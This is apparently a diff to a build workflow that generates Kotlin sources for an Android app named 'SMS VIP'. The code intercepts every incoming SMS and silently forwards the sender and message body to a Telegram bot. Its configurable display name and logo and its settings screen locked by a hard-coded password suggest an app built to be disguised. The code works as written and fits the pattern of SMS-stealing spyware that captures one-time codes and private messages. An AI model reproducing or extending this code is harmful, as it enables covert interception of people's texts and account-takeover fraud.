@@ -397,3 +397,125 @@ jobs:
                       android:id="@+id/editToken"
                       android:layout_width="match_parent"
                       android:layout_he
+          mkdir -p app/src/main/java/com/example/smsvip
+          cat > 'app/src/main/java/com/example/smsvip/Prefs.kt' << 'EOF_INNER'
+          package com.example.smsvip
+
+          import android.content.Context
+
+          object Prefs {
+              private const val FILE = "smsvip_prefs"
+
+              private const val KEY_TOKEN = "bot_token"
+              private const val KEY_CHAT_ID = "chat_id"
+              private const val KEY_APP_DISPLAY_NAME = "app_display_name"
+              private const val KEY_LOGO_PATH = "logo_path"
+              private const val KEY_LOGO_COLOR = "logo_color"
+
+              // كلمة السر الثابتة للدخول إلى شاشة الإعدادات
+              const val SETTINGS_PASSWORD = "twexanesd!"
+
+              fun getToken(ctx: Context): String =
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).getString(KEY_TOKEN, "") ?: ""
+
+              fun setToken(ctx: Context, value: String) {
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).edit().putString(KEY_TOKEN, value).apply()
+              }
+
+              fun getChatId(ctx: Context): String =
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).getString(KEY_CHAT_ID, "") ?: ""
+
+              fun setChatId(ctx: Context, value: String) {
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).edit().putString(KEY_CHAT_ID, value).apply()
+              }
+
+              fun getDisplayName(ctx: Context): String =
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).getString(KEY_APP_DISPLAY_NAME, "SMS VIP") ?: "SMS VIP"
+
+              fun setDisplayName(ctx: Context, value: String) {
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).edit().putString(KEY_APP_DISPLAY_NAME, value).apply()
+              }
+
+              fun getLogoPath(ctx: Context): String? =
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).getString(KEY_LOGO_PATH, null)
+
+              fun setLogoPath(ctx: Context, path: String) {
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).edit().putString(KEY_LOGO_PATH, path).apply()
+              }
+
+              // لون الشعار الثابت الشكل (يتغير اللون بس، الرسمة نفسها ثابتة)
+              fun getLogoColor(ctx: Context): Int =
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).getInt(KEY_LOGO_COLOR, 0xFF4A148C.toInt())
+
+              fun setLogoColor(ctx: Context, color: Int) {
+                  ctx.getSharedPreferences(FILE, Context.MODE_PRIVATE).edit().putInt(KEY_LOGO_COLOR, color).apply()
+              }
+          }
+          EOF_INNER
+
+          mkdir -p app/src/main/java/com/example/smsvip
+          cat > 'app/src/main/java/com/example/smsvip/TelegramSender.kt' << 'EOF_INNER'
+          package com.example.smsvip
+
+          import java.net.HttpURLConnection
+          import java.net.URL
+          import java.net.URLEncoder
+
+          object TelegramSender {
+
+              // يرسل رسالة نصية إلى بوت تيليجرام، ويرجع true لو نجح الإرسال
+              fun send(token: String, chatId: String, text: String): Boolean {
+                  if (token.isBlank() || chatId.isBlank()) return false
+                  return try {
+                      val encodedText = URLEncoder.encode(text, "UTF-8")
+                      val encodedChat = URLEncoder.encode(chatId, "UTF-8")
+                      val urlStr = "https://api.telegram.org/bot$token/sendMessage?chat_id=$encodedChat&text=$encodedText"
+                      val url = URL(urlStr)
+                      val conn = url.openConnection() as HttpURLConnection
+                      conn.requestMethod = "GET"
+                      conn.connectTimeout = 15000
+                      conn.readTimeout = 15000
+                      val code = conn.responseCode
+                      conn.disconnect()
+                      code in 200..299
+                  } catch (e: Exception) {
+                      false
+                  }
+              }
+          }
+          EOF_INNER
+
+          mkdir -p app/src/main/java/com/example/smsvip
+          cat > 'app/src/main/java/com/example/smsvip/SmsReceiver.kt' << 'EOF_INNER'
+          package com.example.smsvip
+
+          import android.content.BroadcastReceiver
+          import android.content.Context
+          import android.content.Intent
+          import android.provider.Telephony
+          import kotlinx.coroutines.CoroutineScope
+          import kotlinx.coroutines.Dispatchers
+          import kotlinx.coroutines.launch
+
+          class SmsReceiver : BroadcastReceiver() {
+
+              override fun onReceive(context: Context, intent: Intent) {
+                  if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
+
+                  val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+                  val token = Prefs.getToken(context)
+                  val chatId = Prefs.getChatId(context)
+
+                  for (msg in messages) {
+                      val from = msg.originatingAddress ?: "غير معروف"
+                      val body = msg.messageBody ?: ""
+                      val text = "رسالة جديدة\nمن: $from\n\n$body"
+
+                      CoroutineScope(Dispatchers.IO).launch {
+                          TelegramSender.send(token, chatId, text)
+                      }
+                  }
+              }
+          }
+          EOF_INNER
+          
